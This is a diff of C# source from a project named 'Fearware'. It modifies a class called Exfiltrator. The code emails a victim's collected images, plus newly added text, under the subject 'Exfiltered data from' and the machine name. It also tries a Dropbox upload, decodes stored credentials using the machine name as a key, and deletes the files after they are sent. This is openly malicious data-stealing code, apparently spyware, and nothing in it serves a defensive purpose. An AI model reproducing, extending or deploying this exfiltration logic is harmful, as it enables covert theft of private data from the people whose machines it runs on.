@@ -1,6 +1,4 @@
-﻿
-
-using Dropbox.Api;
+﻿using Dropbox.Api;
 using Dropbox.Api.Files;
 using System;
 using System.IO;
@@ -18,9 +16,8 @@ namespace Fearware
     public static class Exfiltrator
     {
         private static string[] imagesList;
-        private static NameValueCollection secretSection = (NameValueCollection)ConfigurationManager.GetSection("localSecrets");
 
-        public static void Start(string imagesPath)
+        public static void Start(string text,string imagesPath)
         {
 
             //Dropbox attempt
@@ -34,7 +31,7 @@ namespace Fearware
                 
                     
                 int endList = imagesList.Length - 1;
-                if (email_send(imagesList) == 0)
+                if (email_send(text,imagesList) == 0)
                 {
                     DeleteFile(imagesList);
                 }
@@ -47,7 +44,7 @@ namespace Fearware
             Console.WriteLine("finito");
         }
 
-        public static int email_send(string[] imagesList)
+        public static int email_send(string text, string[] imagesList)
         {
             try
             {
@@ -56,7 +53,7 @@ namespace Fearware
                 mail.From = new MailAddress(Core.Base64Decode((string)Core.GetCredJson()["username"], Environment.MachineName));
                 mail.To.Add(Core.Base64Decode((string)Core.GetCredJson()["username"], Environment.MachineName));
                 mail.Subject = "Exfiltered data from "+Environment.MachineName;
-                mail.Body = "mail with attachment";
+                mail.Body = text;
 
                 int endList = imagesList.Length - 1;
                 for (int i = 0; i<= endList; i++) {
